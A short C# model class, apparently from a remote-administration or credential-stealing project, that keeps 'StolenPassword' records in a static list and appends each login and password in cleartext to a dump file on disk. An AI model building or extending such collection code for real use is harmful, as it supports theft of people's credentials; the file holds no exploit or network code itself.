using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace RemoteAdmin.Models
{
    public class FakeDataBase
    {
        public static List<StolenPassword> passwords = new List<StolenPassword>();
        public static int Id { get; set; } = 0;

        public static IEnumerable<StolenPassword> GetPasswords
        {
            get{
                return passwords;
            }
        }

        public static void AddPassword(StolenPassword pass)
        {
            passwords.Add(pass);
        }
        //TODO add Entity FrameWork 
        public static void GetDump(StolenPassword pass)
        {
            Id += 1;
            using (StreamWriter sw = new StreamWriter("d://dump.txt", true))
            {
                sw.WriteLine("Id:" + Id);
                sw.WriteLine("Login:" + pass.Login);
                sw.WriteLine("Pass: " + pass.Password);
                sw.WriteLine();
            }
        }
          
        

    }
}
